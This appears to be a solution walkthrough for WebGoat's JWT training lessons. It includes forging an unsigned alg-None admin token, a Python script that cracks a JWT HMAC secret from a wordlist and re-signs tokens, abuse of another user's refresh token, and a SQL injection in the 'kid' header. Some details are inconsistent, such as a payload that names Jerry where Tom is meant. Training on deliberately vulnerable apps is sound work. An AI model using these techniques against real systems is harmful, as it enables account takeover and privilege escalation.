# task 3

Just pass token in webwolf and read the username: user

# task 5

```
Intersept request, send from any user ex. Tom( change users in right top corner)
Gain access token and decode its heder,payload in base64.
```

```
access_token:eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1ODYxNjAzNTUsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0.dsugXZYLM8WnyzWAA-CFOXCAzfVn0DwzrlmeY6Bns-Uce9Ez3IMq4SSLbk1YgQWNeg7kchjL9wUIqo6nVg8Sfg
```

```
HEADER:{"alg":"HS512"}
```

```
PAYLOAD:{
  "iat": 1586160355,
  "admin": "false",
  "user": "Tom"
}
```

Change admin to true and alg to none, encode in base64,send in repeater

```
Header:
{
  "alg": "None"
}

Payload:
{
  "iat": 1586160355,
  "admin": "true",
  "user": "Tom"
}
```

```
encoded new header:eyJhbGciOiJOb25lIn0=
```

```
encoded new payload:eyJpYXQiOjE2NDg2NDcwMjYsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9
```

```
final token:eyAiYWxnIjogIk5vbmUiIH0.eyAgImlhdCI6IDE1ODYxNjAzNTUsICAiYWRtaW4iOiAidHJ1ZSIsICAidXNlciI6ICJUb20ifQ.
```

# Task 7

```
1.Throws an exception in line 12
```

```
2.Logs an error in line 9
```

# Task 8

```
answer: victory
```

Brute force jwtcracker or alogirthm ( have to import word dictionary example https://github.com/first20hours/google-10000-english)

```
import base64
import hashlib
import hmac

def jwt_tokens_5():
     token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTYxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.vPe-qQPOt78zK8wrbN1TjNJj3LeX9Qbch6oo23RUJgM'.split('.')

     payload = '{"iss":"WebGoat Token Builder","iat":1524210904,"exp":1618905304,"aud":"webgoat.org","sub":"tom@webgoat.com","username":"WebGoat","Email":"tom@webgoat.com","Role":["Manager","Project Administrator"]}'.encode()

     unsigned_token = (token[0] + '.' + token[1]).encode()

     # signature is base64 URL encoded and padding has been removed, so we must add it
     signature = (token[2] + '=' * (-len(token[2]) % 4)).encode()

     with open('google-10000-english-master/google-10000-english.txt', 'r') as fd:
         lines = [line.rstrip('\n').encode() for line in fd]

     def hmac_base64(key, message):
         return base64.urlsafe_b64encode(bytes.fromhex(hmac.new(key, message, hashlib.sha256).hexdigest()))

     for line in lines:
         test = hmac_base64(line, unsigned_token)

         if test == signature:
             print('Key: {}'.format(line.decode()))
             new_token = (token[0] + '.' + base64.urlsafe_b64encode(payload).decode().rstrip('=')).encode()
             new_signature = hmac_base64(line, new_token)
             new_token += ('.' + new_signature.decode().rstrip('=')).encode()
             print('New token: {}'.format(new_token.decode()))
             return

jwt_tokens_5()
```

# Task 10

```
Network tab catch login response to get Jerry credentials
```

```
{
    "user": "Jerry",
    "password": "bm5nhSkxCXZkKRy4"
}
```

Also response tokens

```
{
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IkplcnJ5In0.Z-ZX2L0Tuub0LEyj9NmyVADu7tK40gL9h1EJeRg1DDa6z5_H-SrexH1MYHoIxRyApnOP7NfFonP3rOw1Y5qi0A",
  "refresh_token" : "CXtmpNToIqJdepIKGcgi"
}
```

Get Tom's access token based on JErry refresh token and old expired Tom's acces token from log,

```
endpoint: http://localhost:8080/WebGoat/JWT/refresh/newToken
```

Add John's refresh token in payload and get new tokens

```
  "access_token" : "eyJhbGciOiJIUzUxMiJ9.eyJhZG1pbiI6ImZhbHNlIiwidXNlciI6IlRvbSJ9.a4yUoDOuv6L7ICs-HsE6craLHG_u6YDTkmXiGHjF7GdJZVZWCTurWBBunW9ujab8f4vNG31XAEvWYUEmAt0SGg",
  "refresh_token" : "zEnjGKfcHaJKbxQJsQXG"
}
```

Now. intercept for checkout response, after clicking checkout button, and resent request with Toms access token in authorization header.

# Task 11

Try to delete Toms account ( button), and catch delete response with token. Place token in jwt.io editor.

```
header:{
  "typ": "JWT",
  "kid": "webgoat_key",
  "alg": "HS256"
}
```

```
payload: {
  "iss": "WebGoat Token Builder",
  "iat": 1524210904,
  "exp": 1618905304,
  "aud": "webgoat.org",
  "sub": "jerry@webgoat.com",
  "username": "Jerry",
  "Email": "jerry@webgoat.com",
  "Role": [
    "Cat"
  ]
}
```

We can see there is new field in header kid, do sql injection on this field. Code in base64 value of string new_key. Path to source code of lesson is https://github.com/WebGoat/WebGoat/blob/develop/webgoat-lessons/jwt/src/main/java/org/owasp/webgoat/jwt/JWTFinalEndpoint.java.

```
bmV3X2tleQ==
```

Replace kid with

```
"something_else' UNION SELECT 'bmV3X2tleQ==' FROM INFORMATION_SCHEMA.SYSTEM_USERS; --";

```

Change Jerry to Tom in payload of token, change expiration date to later, change signature to "new_key". New token generated is

```
eyJ0eXAiOiJKV1QiLCJraWQiOiJ3ZWJnb2F0X2tleSIsImFsZyI6IkhTMjU2In0.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJpYXQiOjE1MjQyMTA5MDQsImV4cCI6MTcxODkwNTMwNCwiYXVkIjoid2ViZ29hdC5vcmciLCJzdWIiOiJ0b21Ad2ViZ29hdC5jb20iLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQuY29tIiwiUm9sZSI6WyJDYXQiXX0.Snpx3XPTFbAkvve7tOUv2TihTNGu_ZRfNF6fci4VC6A
```
